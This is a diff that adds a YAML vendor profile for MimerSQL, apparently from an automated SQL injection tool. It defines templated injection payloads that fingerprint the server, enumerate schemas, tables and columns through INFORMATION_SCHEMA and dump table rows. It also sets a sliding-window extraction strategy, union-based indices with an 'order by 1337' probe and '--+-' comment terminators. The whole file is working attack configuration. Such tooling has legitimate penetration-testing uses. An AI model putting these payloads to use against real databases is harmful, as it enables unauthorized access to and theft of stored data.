@@ -1,0 +1,140 @@
+vendor: MimerSQL
+
+resource:
+ info: |
+  'version()'
+  || '${enclose_value_sql}'
+  || 'database()'
+  || '${enclose_value_sql}'
+  || 'user()'
+  || '${trail_sql}'
+
+ schema:
+  database: |
+   select concat(
+       group_concat(
+           '${enclose_value_sql}'
+           || r
+           || '${separator_qte_sql}'
+           || q
+           || '${enclose_value_sql}',
+           '${separator_cell_sql}'
+       ),
+       '${trail_sql}'
+   ) r from (
+       select distinct
+           SCHEMA_NAME r,
+           '0' q
+       from INFORMATION_SCHEMA.tables
+       right join INFORMATION_SCHEMA.schemata
+       on SCHEMA_NAME = table_schema
+       ${limit}
+   ) x
+
+  table: |
+   select concat(
+       group_concat(
+           '${enclose_value_sql}'
+           || r
+           || '${separator_qte_sql}'
+           || q
+           || '${enclose_value_sql}',
+           '${separator_cell_sql}'
+       ),
+       '${trail_sql}'
+   ) r from (
+       select
+           TABLE_NAME r,
+           '0' q
+       from information_schema.tables
+       where TABLE_SCHEMA = '${database}'
+       order by r
+       ${limit}
+   ) x
+
+  column: |
+   select concat(
+       group_concat(
+           '${enclose_value_sql}'
+           || n
+           || '${separator_qte_sql}'
+           || '0'
+           || '${enclose_value_sql}',
+           '${separator_cell_sql}'
+       ),
+       '${trail_sql}'
+   ) r from (
+       select COLUMN_NAME n
+       from information_schema.columns
+       where TABLE_SCHEMA = '${database}'
+       and TABLE_NAME = '${table}'
+       order by n
+       ${limit}
+   ) x
+
+  row:
+   query: |
+    select concat(
+        group_concat(
+            '${enclose_value_sql}'
+            || r
+            || '${separator_qte_sql}'
+            || '0'
+            || '${enclose_value_sql}',
+            '${separator_cell_sql}'
+        ),
+        '${trail_sql}'
+    ) r from (
+        select
+            ${fields} r,
+            '0' q
+        from ${database}.${table}
+        ${limit}
+    ) x
+   fields:
+    field: trim(coalesce(cast(${field.value} as varchar(2000)), ''))
+    concat: "||'%7f'||"
+
+strategy:
+ configuration:
+  slidingWindow: |
+   (
+       select
+           concat(
+               '${lead}',
+               substring(
+                   (${injection}),
+                   ${window.char},
+                   ${capacity}
+               )
+           )
+       FROM (VALUES(0))
+   )
+  limit: OFFSET ${limit.value} ROWS FETCH NEXT 100 ROWS ONLY
+  failsafe: 
+   select
+       cast((1337${indice}7330%2b1)as varchar(2000))
+       || '' r
+   FROM (VALUES(0))  
+  calibrator: repeat('${calibrator_sql}', 2000)
+  limitBoundary: 0
+  # Encoded space mandatory to avoid space cleaning
+  # TODO keep raw space
+  # endingComment: --+-
+  # pentesterlab does not work with --+-, switch to #
+  endingComment: --+-
+  fingerprint:
+   errorMessage:
+    - mimersql
+
+ normal:
+  indices: union select ${result_range} from (${indice_unique}) b
+  capacity: |
+   (
+       select 
+           '${lead}'
+           || '${indice}'
+           || ${calibrator}
+       FROM (VALUES(0))
+   )
+  orderBy: order by 1337
